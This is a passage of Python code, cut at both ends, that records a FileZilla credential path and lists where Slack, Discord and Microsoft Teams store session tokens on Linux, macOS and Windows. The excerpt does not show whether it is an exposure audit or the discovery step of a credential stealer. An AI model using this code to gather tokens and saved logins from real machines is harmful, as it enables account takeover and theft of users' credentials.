                results['remote_access'].append({'tool': 'FileZilla', 'path': fz_path})

    # ── 5. Messaging App Tokens ──
    token_locations = [
        ('Slack', os.path.join(home, '.config', 'Slack', 'storage', 'slack-downloads')),
        ('Slack', os.path.join(home, 'Library', 'Application Support', 'Slack', 'storage')),
        ('Discord', os.path.join(home, '.config', 'discord', 'Local Storage', 'leveldb')),
        ('Discord', os.path.join(home, 'Library', 'Application Support', 'discord', 'Local Storage', 'leveldb')),
        ('Discord', os.path.join(home, 'AppData', 'Roaming', 'discord', 'Local Storage', 'leveldb')),
        ('Teams', os.path.join(home, '.config', 'Microsoft', 'Microsoft Teams', 'Local Storage', 'leveldb')),
        ('Teams', os.path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Teams', 'Local Storage', 'leveldb')),
